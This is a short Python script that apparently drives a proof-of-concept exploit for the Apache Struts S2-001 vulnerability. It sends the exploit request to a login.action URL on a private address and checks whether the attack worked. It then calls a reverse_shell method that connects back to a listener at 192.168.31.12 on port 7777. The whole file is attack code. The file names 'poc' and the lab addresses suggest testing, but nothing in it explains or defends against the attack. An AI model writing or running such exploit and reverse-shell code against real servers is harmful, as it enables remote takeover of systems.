# coding: utf-8
'''
Created on 2020年5月25日

@author: raytine
'''
from poc.struts.S2001 import Struts001

struts001 = Struts001("http://192.168.31.67:8080/login.action")
res = struts001.sendRequest()
print(res)
res = struts001.checkRsult(res)
print(res)
res = struts001.reverse_shell("192.168.31.12", 7777)
print(res)